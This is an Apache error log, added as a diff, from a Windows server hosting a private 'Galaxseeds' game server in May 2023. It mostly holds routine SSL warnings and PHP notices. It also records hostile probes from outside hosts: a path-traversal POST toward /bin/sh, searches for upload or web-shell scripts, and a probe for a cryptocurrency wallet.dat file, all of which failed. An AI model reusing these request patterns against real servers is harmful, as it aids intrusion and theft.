@@ -1,0 +1,459 @@
+[Wed May 10 13:59:43.481978 2023] [mpm_winnt:crit] [pid 38848:tid 640] AH02538: Child: Parent process exited abruptly. Child process is ending
+[Wed May 10 20:33:32.041764 2023] [ssl:warn] [pid 8980:tid 756] AH01906: main-serveur:443:0 server certificate is a CA certificate (BasicConstraints: CA == TRUE !?)
+[Wed May 10 20:33:32.042775 2023] [ssl:warn] [pid 8980:tid 756] AH01909: main-serveur:443:0 server certificate does NOT include an ID which matches the server name
+[Wed May 10 20:33:32.064764 2023] [core:warn] [pid 8980:tid 756] AH00098: pid file C:/Galaxseeds/Galaxseeds/Web Server/bin/apache/logs/httpd.pid overwritten -- Unclean shutdown of previous Apache run?
+[Wed May 10 20:33:32.119765 2023] [ssl:warn] [pid 8980:tid 756] AH01873: Init: Session Cache is not configured [hint: SSLSessionCache]
+[Wed May 10 20:33:32.120764 2023] [ssl:warn] [pid 8980:tid 756] AH01906: main-serveur:443:0 server certificate is a CA certificate (BasicConstraints: CA == TRUE !?)
+[Wed May 10 20:33:32.120764 2023] [ssl:warn] [pid 8980:tid 756] AH01909: main-serveur:443:0 server certificate does NOT include an ID which matches the server name
+[Wed May 10 20:33:32.727765 2023] [mpm_winnt:notice] [pid 8980:tid 756] AH00455: Apache/2.4.18 (Win32) OpenSSL/1.0.2f PHP/7.0.3 configured -- resuming normal operations
+[Wed May 10 20:33:32.727765 2023] [mpm_winnt:notice] [pid 8980:tid 756] AH00456: Server built: Jan 28 2016 09:58:25
+[Wed May 10 20:33:32.727765 2023] [core:notice] [pid 8980:tid 756] AH00094: Command line: 'C:\\Galaxseeds\\Galaxseeds\\Web Server\\bin\\apache\\bin\\httpd.exe -d C:/Galaxseeds/Galaxseeds/Web Server/bin/apache -f C:\\Galaxseeds\\Galaxseeds\\Web Server\\bin\\apache\\conf\\httpd.conf'
+[Wed May 10 20:33:32.731764 2023] [mpm_winnt:notice] [pid 8980:tid 756] AH00418: Parent: Created child process 6600
+[Wed May 10 20:33:33.166769 2023] [ssl:warn] [pid 6600:tid 744] AH01906: main-serveur:443:0 server certificate is a CA certificate (BasicConstraints: CA == TRUE !?)
+[Wed May 10 20:33:33.166769 2023] [ssl:warn] [pid 6600:tid 744] AH01909: main-serveur:443:0 server certificate does NOT include an ID which matches the server name
+[Wed May 10 20:33:33.269765 2023] [ssl:warn] [pid 6600:tid 744] AH01873: Init: Session Cache is not configured [hint: SSLSessionCache]
+[Wed May 10 20:33:33.270765 2023] [ssl:warn] [pid 6600:tid 744] AH01906: main-serveur:443:0 server certificate is a CA certificate (BasicConstraints: CA == TRUE !?)
+[Wed May 10 20:33:33.270765 2023] [ssl:warn] [pid 6600:tid 744] AH01909: main-serveur:443:0 server certificate does NOT include an ID which matches the server name
+[Wed May 10 20:33:33.297765 2023] [mpm_winnt:notice] [pid 6600:tid 744] AH00354: Child: Starting 64 worker threads.
+[Thu May 11 02:22:37.911173 2023] [:error] [pid 6600:tid 1560] [client 167.71.238.141:41126] script 'C:/Galaxseeds/Galaxseeds/Web Server/www/upl.php' not found or unable to stat
+[Thu May 11 03:58:29.882433 2023] [core:error] [pid 6600:tid 1560] [client 152.89.196.144:56980] AH00126: Invalid URI in request POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1
+[Thu May 11 04:04:11.621434 2023] [:error] [pid 6600:tid 1572] [client 174.92.84.68:1177] PHP Notice:  Undefined index: Service in C:\\Galaxseeds\\Galaxseeds\\Web Server\\www\\services\\script.php on line 2, referer: http://galaxseeds.thebigrip.com/Client.swf
+[Thu May 11 04:04:11.621434 2023] [:error] [pid 6600:tid 1572] [client 174.92.84.68:1177] PHP Stack trace:, referer: http://galaxseeds.thebigrip.com/Client.swf
+[Thu May 11 04:04:11.621434 2023] [:error] [pid 6600:tid 1572] [client 174.92.84.68:1177] PHP   1. {main}() C:\\Galaxseeds\\Galaxseeds\\Web Server\\www\\services\\script.php:0, referer: http://galaxseeds.thebigrip.com/Client.swf
+[Thu May 11 04:04:11.623433 2023] [:error] [pid 6600:tid 1572] [client 174.92.84.68:1177] PHP Notice:  Undefined index: Service in C:\\Galaxseeds\\Galaxseeds\\Web Server\\www\\services\\script.php on line 12, referer: http://galaxseeds.thebigrip.com/Client.swf
+[Thu May 11 04:04:11.623433 2023] [:error] [pid 6600:tid 1572] [client 174.92.84.68:1177] PHP Stack trace:, referer: http://galaxseeds.thebigrip.com/Client.swf
+[Thu May 11 04:04:11.623433 2023] [:error] [pid 6600:tid 1572] [client 174.92.84.68:1177] PHP   1. {main}() C:\\Galaxseeds\\Galaxseeds\\Web Server\\www\\services\\script.php:0, referer: http://galaxseeds.thebigrip.com/Client.swf
+[Thu May 11 04:04:12.355433 2023] [:error] [pid 6600:tid 1572] [client 174.92.84.68:1177] PHP Notice:  Undefined index: Service in C:\\Galaxseeds\\Galaxseeds\\Web Server\\www\\services\\script.php on line 2, referer: http://galaxseeds.thebigrip.com/Client.swf
+[Thu May 11 04:04:12.355433 2023] [:error] [pid 6600:tid 1572] [client 174.92.84.68:1177] PHP Stack trace:, referer: http://galaxseeds.thebigrip.com/Client.swf
+[Thu May 11 04:04:12.355433 2023] [:error] [pid 6600:tid 1572] [client 174.92.84.68:1177] PHP   1. {main}() C:\\Galaxseeds\\Galaxseeds\\Web Server\\www\\services\\script.php:0, referer: http://galaxseeds.thebigrip.com/Client.swf
+[Thu May 11 04:04:12.355433 2023] [:error] [pid 6600:tid 1572] [client 174.92.84.68:1177] PHP Notice:  Undefined index: Service in C:\\Galaxseeds\\Galaxseeds\\Web Server\\www\\services\\script.php on line 12, referer: http://galaxseeds.thebigrip.com/Client.swf
+[Thu May 11 04:04:12.355433 2023] [:error] [pid 6600:tid 1572] [client 174.92.84.68:1177] PHP Stack trace:, referer: http://galaxseeds.thebigrip.com/Client.swf
+[Thu May 11 04:04:12.355433 2023] [:error] [pid 6600:tid 1572] [client 174.92.84.68:1177] PHP   1. {main}() C:\\Galaxseeds\\Galaxseeds\\Web Server\\www\\services\\script.php:0, referer: http://galaxseeds.thebigrip.com/Client.swf
+[Thu May 11 04:04:13.059433 2023] [:error] [pid 6600:tid 1572] [client 174.92.84.68:1177] PHP Notice:  Undefined index: Service in C:\\Galaxseeds\\Galaxseeds\\Web Server\\www\\services\\script.php on line 2, referer: http://galaxseeds.thebigrip.com/Client.swf
+[Thu May 11 04:04:13.059433 2023] [:error] [pid 6600:tid 1572] [client 174.92.84.68:1177] PHP Stack trace:, referer: http://galaxseeds.thebigrip.com/Client.swf
+[Thu May 11 04:04:13.059433 2023] [:error] [pid 6600:tid 1572] [client 174.92.84.68:1177] PHP   1. {main}() C:\\Galaxseeds\\Galaxseeds\\Web Server\\www\\services\\script.php:0, referer: http://galaxseeds.thebigrip.com/Client.swf
+[Thu May 11 04:04:13.059433 2023] [:error] [pid 6600:tid 1572] [client 174.92.84.68:1177] PHP Notice:  Undefined index: Service in C:\\Galaxseeds\\Galaxseeds\\Web Server\\www\\services\\script.php on line 12, referer: http://galaxseeds.thebigrip.com/Client.swf
+[Thu May 11 04:04:13.059433 2023] [:error] [pid 6600:tid 1572] [client 174.92.84.68:1177] PHP Stack trace:, referer: http://galaxseeds.thebigrip.com/Client.swf
+[Thu May 11 04:04:13.059433 2023] [:error] [pid 6600:tid 1572] [client 174.92.84.68:1177] PHP   1. {main}() C:\\Galaxseeds\\Galaxseeds\\Web Server\\www\\services\\script.php:0, referer: http://galaxseeds.thebigrip.com/Client.swf
+[Thu May 11 04:04:13.531432 2023] [:error] [pid 6600:tid 1572] [client 174.92.84.68:1177] PHP Notice:  Undefined index: Service in C:\\Galaxseeds\\Galaxseeds\\Web Server\\www\\services\\script.php on line 2, referer: http://galaxseeds.thebigrip.com/Client.swf
+[Thu May 11 04:04:13.531432 2023] [:error] [pid 6600:tid 1572] [client 174.92.84.68:1177] PHP Stack trace:, referer: http://galaxseeds.thebigrip.com/Client.swf
+[Thu May 11 04:04:13.531432 2023] [:error] [pid 6600:tid 1572] [client 174.92.84.68:1177] PHP   1. {main}() C:\\Galaxseeds\\Galaxseeds\\Web Server\\www\\services\\script.php:0, referer: http://galaxseeds.thebigrip.com/Client.swf
+[Thu May 11 04:04:13.531432 2023] [:error] [pid 6600:tid 1572] [client 174.92.84.68:1177] PHP Notice:  Undefined index: Service in C:\\Galaxseeds\\Galaxseeds\\Web Server\\www\\services\\script.php on line 12, referer: http://galaxseeds.thebigrip.com/Client.swf
+[Thu May 11 04:04:13.531432 2023] [:error] [pid 6600:tid 1572] [client 174.92.84.68:1177] PHP Stack trace:, referer: http://galaxseeds.thebigrip.com/Client.swf
+[Thu May 11 04:04:13.531432 2023] [:error] [pid 6600:tid 1572] [client 174.92.84.68:1177] PHP   1. {main}() C:\\Galaxseeds\\Galaxseeds\\Web Server\\www\\services\\script.php:0, referer: http://galaxseeds.thebigrip.com/Client.swf
+[Thu May 11 04:04:14.013434 2023] [:error] [pid 6600:tid 1572] [client 174.92.84.68:1177] PHP Notice:  Undefined index: Service in C:\\Galaxseeds\\Galaxseeds\\Web Server\\www\\services\\script.php on line 2, referer: http://galaxseeds.thebigrip.com/Client.swf
+[Thu May 11 04:04:14.013434 2023] [:error] [pid 6600:tid 1572] [client 174.92.84.68:1177] PHP Stack trace:, referer: http://galaxseeds.thebigrip.com/Client.swf
+[Thu May 11 04:04:14.013434 2023] [:error] [pid 6600:tid 1572] [client 174.92.84.68:1177] PHP   1. {main}() C:\\Galaxseeds\\Galaxseeds\\Web Server\\www\\services\\script.php:0, referer: http://galaxseeds.thebigrip.com/Client.swf
+[Thu May 11 04:04:14.013434 2023] [:error] [pid 6600:tid 1572] [client 174.92.84.68:1177] PHP Notice:  Undefined index: Service in C:\\Galaxseeds\\Galaxseeds\\Web Server\\www\\services\\script.php on line 12, referer: http://galaxseeds.thebigrip.com/Client.swf
+[Thu May 11 04:04:14.013434 2023] [:error] [pid 6600:tid 1572] [client 174.92.84.68:1177] PHP Stack trace:, referer: http://galaxseeds.thebigrip.com/Client.swf
+[Thu May 11 04:04:14.013434 2023] [:error] [pid 6600:tid 1572] [client 174.92.84.68:1177] PHP   1. {main}() C:\\Galaxseeds\\Galaxseeds\\Web Server\\www\\services\\script.php:0, referer: http://galaxseeds.thebigrip.com/Client.swf
+[Thu May 11 04:04:14.531433 2023] [:error] [pid 6600:tid 1572] [client 174.92.84.68:1177] PHP Notice:  Undefined index: Service in C:\\Galaxseeds\\Galaxseeds\\Web Server\\www\\services\\script.php on line 2, referer: http://galaxseeds.thebigrip.com/Client.swf
+[Thu May 11 04:04:14.531433 2023] [:error] [pid 6600:tid 1572] [client 174.92.84.68:1177] PHP Stack trace:, referer: http://galaxseeds.thebigrip.com/Client.swf
+[Thu May 11 04:04:14.531433 2023] [:error] [pid 6600:tid 1572] [client 174.92.84.68:1177] PHP   1. {main}() C:\\Galaxseeds\\Galaxseeds\\Web Server\\www\\services\\script.php:0, referer: http://galaxseeds.thebigrip.com/Client.swf
+[Thu May 11 04:04:14.531433 2023] [:error] [pid 6600:tid 1572] [client 174.92.84.68:1177] PHP Notice:  Undefined index: Service in C:\\Galaxseeds\\Galaxseeds\\Web Server\\www\\services\\script.php on line 12, referer: http://galaxseeds.thebigrip.com/Client.swf
+[Thu May 11 04:04:14.531433 2023] [:error] [pid 6600:tid 1572] [client 174.92.84.68:1177] PHP Stack trace:, referer: http://galaxseeds.thebigrip.com/Client.swf
+[Thu May 11 04:04:14.531433 2023] [:error] [pid 6600:tid 1572] [client 174.92.84.68:1177] PHP   1. {main}() C:\\Galaxseeds\\Galaxseeds\\Web Server\\www\\services\\script.php:0, referer: http://galaxseeds.thebigrip.com/Client.swf
+[Thu May 11 04:04:16.276432 2023] [:error] [pid 6600:tid 1572] [client 174.92.84.68:1177] PHP Notice:  Undefined index: Service in C:\\Galaxseeds\\Galaxseeds\\Web Server\\www\\services\\script.php on line 2, referer: http://galaxseeds.thebigrip.com/Client.swf
+[Thu May 11 04:04:16.276432 2023] [:error] [pid 6600:tid 1572] [client 174.92.84.68:1177] PHP Stack trace:, referer: http://galaxseeds.thebigrip.com/Client.swf
+[Thu May 11 04:04:16.276432 2023] [:error] [pid 6600:tid 1572] [client 174.92.84.68:1177] PHP   1. {main}() C:\\Galaxseeds\\Galaxseeds\\Web Server\\www\\services\\script.php:0, referer: http://galaxseeds.thebigrip.com/Client.swf
+[Thu May 11 04:04:16.276432 2023] [:error] [pid 6600:tid 1572] [client 174.92.84.68:1177] PHP Notice:  Undefined index: Service in C:\\Galaxseeds\\Galaxseeds\\Web Server\\www\\services\\script.php on line 12, referer: http://galaxseeds.thebigrip.com/Client.swf
+[Thu May 11 04:04:16.276432 2023] [:error] [pid 6600:tid 1572] [client 174.92.84.68:1177] PHP Stack trace:, referer: http://galaxseeds.thebigrip.com/Client.swf
+[Thu May 11 04:04:16.276432 2023] [:error] [pid 6600:tid 1572] [client 174.92.84.68:1177] PHP   1. {main}() C:\\Galaxseeds\\Galaxseeds\\Web Server\\www\\services\\script.php:0, referer: http://galaxseeds.thebigrip.com/Client.swf
+[Thu May 11 04:04:19.297434 2023] [:error] [pid 6600:tid 1572] [client 174.92.84.68:1177] PHP Notice:  Undefined index: Service in C:\\Galaxseeds\\Galaxseeds\\Web Server\\www\\services\\script.php on line 2, referer: http://galaxseeds.thebigrip.com/Client.swf
+[Thu May 11 04:04:19.297434 2023] [:error] [pid 6600:tid 1572] [client 174.92.84.68:1177] PHP Stack trace:, referer: http://galaxseeds.thebigrip.com/Client.swf
+[Thu May 11 04:04:19.297434 2023] [:error] [pid 6600:tid 1572] [client 174.92.84.68:1177] PHP   1. {main}() C:\\Galaxseeds\\Galaxseeds\\Web Server\\www\\services\\script.php:0, referer: http://galaxseeds.thebigrip.com/Client.swf
+[Thu May 11 04:04:19.297434 2023] [:error] [pid 6600:tid 1572] [client 174.92.84.68:1177] PHP Notice:  Undefined index: Service in C:\\Galaxseeds\\Galaxseeds\\Web Server\\www\\services\\script.php on line 12, referer: http://galaxseeds.thebigrip.com/Client.swf
+[Thu May 11 04:04:19.297434 2023] [:error] [pid 6600:tid 1572] [client 174.92.84.68:1177] PHP Stack trace:, referer: http://galaxseeds.thebigrip.com/Client.swf
+[Thu May 11 04:04:19.297434 2023] [:error] [pid 6600:tid 1572] [client 174.92.84.68:1177] PHP   1. {main}() C:\\Galaxseeds\\Galaxseeds\\Web Server\\www\\services\\script.php:0, referer: http://galaxseeds.thebigrip.com/Client.swf
+[Thu May 11 04:04:20.849433 2023] [:error] [pid 6600:tid 1572] [client 174.92.84.68:1177] PHP Notice:  Undefined index: Service in C:\\Galaxseeds\\Galaxseeds\\Web Server\\www\\services\\script.php on line 2, referer: http://galaxseeds.thebigrip.com/Client.swf
+[Thu May 11 04:04:20.849433 2023] [:error] [pid 6600:tid 1572] [client 174.92.84.68:1177] PHP Stack trace:, referer: http://galaxseeds.thebigrip.com/Client.swf
+[Thu May 11 04:04:20.849433 2023] [:error] [pid 6600:tid 1572] [client 174.92.84.68:1177] PHP   1. {main}() C:\\Galaxseeds\\Galaxseeds\\Web Server\\www\\services\\script.php:0, referer: http://galaxseeds.thebigrip.com/Client.swf
+[Thu May 11 04:04:20.849433 2023] [:error] [pid 6600:tid 1572] [client 174.92.84.68:1177] PHP Notice:  Undefined index: Service in C:\\Galaxseeds\\Galaxseeds\\Web Server\\www\\services\\script.php on line 12, referer: http://galaxseeds.thebigrip.com/Client.swf
+[Thu May 11 04:04:20.849433 2023] [:error] [pid 6600:tid 1572] [client 174.92.84.68:1177] PHP Stack trace:, referer: http://galaxseeds.thebigrip.com/Client.swf
+[Thu May 11 04:04:20.849433 2023] [:error] [pid 6600:tid 1572] [client 174.92.84.68:1177] PHP   1. {main}() C:\\Galaxseeds\\Galaxseeds\\Web Server\\www\\services\\script.php:0, referer: http://galaxseeds.thebigrip.com/Client.swf
+[Thu May 11 04:04:21.425431 2023] [:error] [pid 6600:tid 1572] [client 174.92.84.68:1177] PHP Notice:  Undefined index: Service in C:\\Galaxseeds\\Galaxseeds\\Web Server\\www\\services\\script.php on line 2, referer: http://galaxseeds.thebigrip.com/Client.swf
+[Thu May 11 04:04:21.425431 2023] [:error] [pid 6600:tid 1572] [client 174.92.84.68:1177] PHP Stack trace:, referer: http://galaxseeds.thebigrip.com/Client.swf
+[Thu May 11 04:04:21.425431 2023] [:error] [pid 6600:tid 1572] [client 174.92.84.68:1177] PHP   1. {main}() C:\\Galaxseeds\\Galaxseeds\\Web Server\\www\\services\\script.php:0, referer: http://galaxseeds.thebigrip.com/Client.swf
+[Thu May 11 04:04:21.425431 2023] [:error] [pid 6600:tid 1572] [client 174.92.84.68:1177] PHP Notice:  Undefined index: Service in C:\\Galaxseeds\\Galaxseeds\\Web Server\\www\\services\\script.php on line 12, referer: http://galaxseeds.thebigrip.com/Client.swf
+[Thu May 11 04:04:21.425431 2023] [:error] [pid 6600:tid 1572] [client 174.92.84.68:1177] PHP Stack trace:, referer: http://galaxseeds.thebigrip.com/Client.swf
+[Thu May 11 04:04:21.425431 2023] [:error] [pid 6600:tid 1572] [client 174.92.84.68:1177] PHP   1. {main}() C:\\Galaxseeds\\Galaxseeds\\Web Server\\www\\services\\script.php:0, referer: http://galaxseeds.thebigrip.com/Client.swf
+[Thu May 11 05:59:34.677941 2023] [:error] [pid 6600:tid 1560] [client 107.189.8.181:46798] script 'C:/Galaxseeds/Galaxseeds/Web Server/www/upload.php' not found or unable to stat
+[Thu May 11 05:59:41.581941 2023] [authz_core:error] [pid 6600:tid 1560] [client 107.189.8.181:36744] AH01630: client denied by server configuration: C:/Galaxseeds/Galaxseeds/Web Server/phpapps/phpmyadmin/
+[Thu May 11 06:00:13.182941 2023] [authz_core:error] [pid 6600:tid 1560] [client 107.189.8.181:49300] AH01630: client denied by server configuration: C:/Galaxseeds/Galaxseeds/Web Server/phpapps/phpmyadmin/wallet.dat
+[Thu May 11 07:28:03.994584 2023] [mpm_winnt:crit] [pid 6600:tid 744] AH02538: Child: Parent process exited abruptly. Child process is ending
+[Thu May 11 07:41:38.793054 2023] [ssl:warn] [pid 1988:tid 756] AH01906: main-serveur:443:0 server certificate is a CA certificate (BasicConstraints: CA == TRUE !?)
+[Thu May 11 07:41:38.793054 2023] [ssl:warn] [pid 1988:tid 756] AH01909: main-serveur:443:0 server certificate does NOT include an ID which matches the server name
+[Thu May 11 07:41:38.817052 2023] [core:warn] [pid 1988:tid 756] AH00098: pid file C:/Galaxseeds/Galaxseeds/Web Server/bin/apache/logs/httpd.pid overwritten -- Unclean shutdown of previous Apache run?
+[Thu May 11 07:41:38.881628 2023] [ssl:warn] [pid 1988:tid 756] AH01873: Init: Session Cache is not configured [hint: SSLSessionCache]
+[Thu May 11 07:41:38.882639 2023] [ssl:warn] [pid 1988:tid 756] AH01906: main-serveur:443:0 server certificate is a CA certificate (BasicConstraints: CA == TRUE !?)
+[Thu May 11 07:41:38.882639 2023] [ssl:warn] [pid 1988:tid 756] AH01909: main-serveur:443:0 server certificate does NOT include an ID which matches the server name
+[Thu May 11 07:41:39.417627 2023] [mpm_winnt:notice] [pid 1988:tid 756] AH00455: Apache/2.4.18 (Win32) OpenSSL/1.0.2f PHP/7.0.3 configured -- resuming normal operations
+[Thu May 11 07:41:39.418627 2023] [mpm_winnt:notice] [pid 1988:tid 756] AH00456: Server built: Jan 28 2016 09:58:25
+[Thu May 11 07:41:39.418627 2023] [core:notice] [pid 1988:tid 756] AH00094: Command line: 'C:\\Galaxseeds\\Galaxseeds\\Web Server\\bin\\apache\\bin\\httpd.exe -d C:/Galaxseeds/Galaxseeds/Web Server/bin/apache -f C:\\Galaxseeds\\Galaxseeds\\Web Server\\bin\\apache\\conf\\httpd.conf'
+[Thu May 11 07:41:39.421626 2023] [mpm_winnt:notice] [pid 1988:tid 756] AH00418: Parent: Created child process 4952
+[Thu May 11 07:41:39.891628 2023] [ssl:warn] [pid 4952:tid 748] AH01906: main-serveur:443:0 server certificate is a CA certificate (BasicConstraints: CA == TRUE !?)
+[Thu May 11 07:41:39.891628 2023] [ssl:warn] [pid 4952:tid 748] AH01909: main-serveur:443:0 server certificate does NOT include an ID which matches the server name
+[Thu May 11 07:41:39.978626 2023] [ssl:warn] [pid 4952:tid 748] AH01873: Init: Session Cache is not configured [hint: SSLSessionCache]
+[Thu May 11 07:41:39.978626 2023] [ssl:warn] [pid 4952:tid 748] AH01906: main-serveur:443:0 server certificate is a CA certificate (BasicConstraints: CA == TRUE !?)
+[Thu May 11 07:41:39.978626 2023] [ssl:warn] [pid 4952:tid 748] AH01909: main-serveur:443:0 server certificate does NOT include an ID which matches the server name
+[Thu May 11 07:41:40.007628 2023] [mpm_winnt:notice] [pid 4952:tid 748] AH00354: Child: Starting 64 worker threads.
+[Thu May 11 09:27:39.079302 2023] [:error] [pid 4952:tid 1424] [client 185.220.101.162:49655] PHP Notice:  Undefined index: TID in C:\\Galaxseeds\\Galaxseeds\\Web Server\\www\\services\\GET_SCRIPT_ID.php on line 3, referer: http://174.92.84.68/services/
+[Thu May 11 09:27:39.079302 2023] [:error] [pid 4952:tid 1424] [client 185.220.101.162:49655] PHP Stack trace:, referer: http://174.92.84.68/services/
+[Thu May 11 09:27:39.080301 2023] [:error] [pid 4952:tid 1424] [client 185.220.101.162:49655] PHP   1. {main}() C:\\Galaxseeds\\Galaxseeds\\Web Server\\www\\services\\GET_SCRIPT_ID.php:0, referer: http://174.92.84.68/services/
+[Thu May 11 09:32:01.147996 2023] [:error] [pid 4952:tid 1424] [client 185.220.101.162:63955] PHP Notice:  Undefined index: ROOMCODE in C:\\Galaxseeds\\Galaxseeds\\Web Server\\www\\services\\ParseRoomData.php on line 2, referer: http://174.92.84.68/services/
+[Thu May 11 09:32:01.147996 2023] [:error] [pid 4952:tid 1424] [client 185.220.101.162:63955] PHP Stack trace:, referer: http://174.92.84.68/services/
+[Thu May 11 09:32:01.147996 2023] [:error] [pid 4952:tid 1424] [client 185.220.101.162:63955] PHP   1. {main}() C:\\Galaxseeds\\Galaxseeds\\Web Server\\www\\services\\ParseRoomData.php:0, referer: http://174.92.84.68/services/
+[Thu May 11 09:33:21.277300 2023] [:error] [pid 4952:tid 1424] [client 185.220.101.162:57721] PHP Notice:  Undefined index: Service in C:\\Galaxseeds\\Galaxseeds\\Web Server\\www\\services\\getallbuddyscript2.php on line 1, referer: http://174.92.84.68/services/
+[Thu May 11 09:33:21.277300 2023] [:error] [pid 4952:tid 1424] [client 185.220.101.162:57721] PHP Stack trace:, referer: http://174.92.84.68/services/
+[Thu May 11 09:33:21.277300 2023] [:error] [pid 4952:tid 1424] [client 185.220.101.162:57721] PHP   1. {main}() C:\\Galaxseeds\\Galaxseeds\\Web Server\\www\\services\\getallbuddyscript2.php:0, referer: http://174.92.84.68/services/
+[Thu May 11 09:33:39.338328 2023] [:error] [pid 4952:tid 1424] [client 185.220.101.162:20471] PHP Notice:  Array to string conversion in C:\\Galaxseeds\\Galaxseeds\\Web Server\\www\\services\\getallbuddyscript2.php on line 1
+[Thu May 11 09:33:39.338328 2023] [:error] [pid 4952:tid 1424] [client 185.220.101.162:20471] PHP Stack trace:
+[Thu May 11 09:33:39.338328 2023] [:error] [pid 4952:tid 1424] [client 185.220.101.162:20471] PHP   1. {main}() C:\\Galaxseeds\\Galaxseeds\\Web Server\\www\\services\\getallbuddyscript2.php:0
+[Thu May 11 09:33:55.392232 2023] [:error] [pid 4952:tid 1424] [client 185.220.101.162:22697] PHP Notice:  Undefined index: Service in C:\\Galaxseeds\\Galaxseeds\\Web Server\\www\\services\\getbuddyscript.php on line 1, referer: http://174.92.84.68/services/
+[Thu May 11 09:33:55.392232 2023] [:error] [pid 4952:tid 1424] [client 185.220.101.162:22697] PHP Stack trace:, referer: http://174.92.84.68/services/
+[Thu May 11 09:33:55.392232 2023] [:error] [pid 4952:tid 1424] [client 185.220.101.162:22697] PHP   1. {main}() C:\\Galaxseeds\\Galaxseeds\\Web Server\\www\\services\\getbuddyscript.php:0, referer: http://174.92.84.68/services/
+[Thu May 11 09:34:11.309885 2023] [:error] [pid 4952:tid 1424] [client 185.220.101.162:35087] PHP Notice:  Undefined index: Service in C:\\Galaxseeds\\Galaxseeds\\Web Server\\www\\services\\getuserplants2.php on line 1, referer: http://174.92.84.68/services/
+[Thu May 11 09:34:11.309885 2023] [:error] [pid 4952:tid 1424] [client 185.220.101.162:35087] PHP Stack trace:, referer: http://174.92.84.68/services/
+[Thu May 11 09:34:11.309885 2023] [:error] [pid 4952:tid 1424] [client 185.220.101.162:35087] PHP   1. {main}() C:\\Galaxseeds\\Galaxseeds\\Web Server\\www\\services\\getuserplants2.php:0, referer: http://174.92.84.68/services/
+[Thu May 11 09:34:18.822021 2023] [:error] [pid 4952:tid 1420] [client 185.220.101.162:57989] PHP Notice:  Undefined index: Service in C:\\Galaxseeds\\Galaxseeds\\Web Server\\www\\services\\logscript.php on line 1, referer: http://174.92.84.68/services/
+[Thu May 11 09:34:18.822021 2023] [:error] [pid 4952:tid 1420] [client 185.220.101.162:57989] PHP Stack trace:, referer: http://174.92.84.68/services/
+[Thu May 11 09:34:18.822021 2023] [:error] [pid 4952:tid 1420] [client 185.220.101.162:57989] PHP   1. {main}() C:\\Galaxseeds\\Galaxseeds\\Web Server\\www\\services\\logscript.php:0, referer: http://174.92.84.68/services/
+[Thu May 11 09:34:18.822021 2023] [:error] [pid 4952:tid 1420] [client 185.220.101.162:57989] PHP Notice:  Undefined index: Msg in C:\\Galaxseeds\\Galaxseeds\\Web Server\\www\\services\\logscript.php on line 1, referer: http://174.92.84.68/services/
+[Thu May 11 09:34:18.822021 2023] [:error] [pid 4952:tid 1420] [client 185.220.101.162:57989] PHP Stack trace:, referer: http://174.92.84.68/services/
+[Thu May 11 09:34:18.822021 2023] [:error] [pid 4952:tid 1420] [client 185.220.101.162:57989] PHP   1. {main}() C:\\Galaxseeds\\Galaxseeds\\Web Server\\www\\services\\logscript.php:0, referer: http://174.92.84.68/services/
+[Thu May 11 09:34:27.183815 2023] [:error] [pid 4952:tid 1420] [client 185.220.101.162:13691] PHP Notice:  Undefined index: Service in C:\\Galaxseeds\\Galaxseeds\\Web Server\\www\\services\\parsedatabinding.php on line 1, referer: http://174.92.84.68/services/
+[Thu May 11 09:34:27.183815 2023] [:error] [pid 4952:tid 1420] [client 185.220.101.162:13691] PHP Stack trace:, referer: http://174.92.84.68/services/
+[Thu May 11 09:34:27.183815 2023] [:error] [pid 4952:tid 1420] [client 185.220.101.162:13691] PHP   1. {main}() C:\\Galaxseeds\\Galaxseeds\\Web Server\\www\\services\\parsedatabinding.php:0, referer: http://174.92.84.68/services/
+[Thu May 11 13:01:35.349408 2023] [mpm_winnt:warn] [pid 4952:tid 1676] (OS 64)The specified network name is no longer available.  : AH00341: winnt_accept: Asynchronous AcceptEx failed.
+[Thu May 11 14:03:53.100538 2023] [mpm_winnt:warn] [pid 4952:tid 1676] (OS 64)The specified network name is no longer available.  : AH00341: winnt_accept: Asynchronous AcceptEx failed.
+[Thu May 11 17:39:42.371652 2023] [mpm_winnt:warn] [pid 4952:tid 1676] (OS 64)The specified network name is no longer available.  : AH00341: winnt_accept: Asynchronous AcceptEx failed.
+[Thu May 11 19:51:16.483555 2023] [mpm_winnt:warn] [pid 4952:tid 1676] (OS 64)The specified network name is no longer available.  : AH00341: winnt_accept: Asynchronous AcceptEx failed.
+[Fri May 12 00:00:49.988758 2023] [mpm_winnt:warn] [pid 4952:tid 1676] (OS 64)The specified network name is no longer available.  : AH00341: winnt_accept: Asynchronous AcceptEx failed.
+[Fri May 12 02:57:25.628207 2023] [mpm_winnt:warn] [pid 4952:tid 1676] (OS 64)The specified network name is no longer available.  : AH00341: winnt_accept: Asynchronous AcceptEx failed.
+[Fri May 12 03:49:32.514320 2023] [mpm_winnt:warn] [pid 4952:tid 1676] (OS 64)The specified network name is no longer available.  : AH00341: winnt_accept: Asynchronous AcceptEx failed.
+[Fri May 12 08:34:28.211343 2023] [:error] [pid 4952:tid 1340] [client 165.154.119.50:46462] script 'C:/Galaxseeds/Galaxseeds/Web Server/www/index_sso.php' not found or unable to stat
+[Fri May 12 23:43:10.300755 2023] [authz_core:error] [pid 4952:tid 1380] [client 167.172.97.227:56906] AH01630: client denied by server configuration: C:/Galaxseeds/Galaxseeds/Web Server/phpapps/phpmyadmin/scripts
+[Fri May 12 23:46:49.819294 2023] [:error] [pid 4952:tid 1424] [client 44.200.140.217:43822] script 'C:/Galaxseeds/Galaxseeds/Web Server/www/gate.php' not found or unable to stat
+[Sat May 13 03:19:17.897353 2023] [:error] [pid 4952:tid 1356] [client 5.8.10.202:54976] script 'C:/Galaxseeds/Galaxseeds/Web Server/www/phpinfo.php' not found or unable to stat
+[Sat May 13 03:19:19.293510 2023] [:error] [pid 4952:tid 1356] [client 5.8.10.202:18877] script 'C:/Galaxseeds/Galaxseeds/Web Server/www/test.php' not found or unable to stat
+[Sat May 13 03:19:20.009554 2023] [:error] [pid 4952:tid 1356] [client 5.8.10.202:6392] script 'C:/Galaxseeds/Galaxseeds/Web Server/www/1.php' not found or unable to stat
+[Sat May 13 03:19:20.894243 2023] [:error] [pid 4952:tid 1356] [client 5.8.10.202:54968] script 'C:/Galaxseeds/Galaxseeds/Web Server/www/2.php' not found or unable to stat
+[Sat May 13 03:19:21.737828 2023] [:error] [pid 4952:tid 1356] [client 5.8.10.202:19908] script 'C:/Galaxseeds/Galaxseeds/Web Server/www/3.php' not found or unable to stat
+[Sat May 13 23:53:12.034631 2023] [:error] [pid 4952:tid 1408] [client 5.188.210.227:42474] script 'C:/Galaxseeds/Galaxseeds/Web Server/www/echo.php' not found or unable to stat, referer: https://www.google.com/
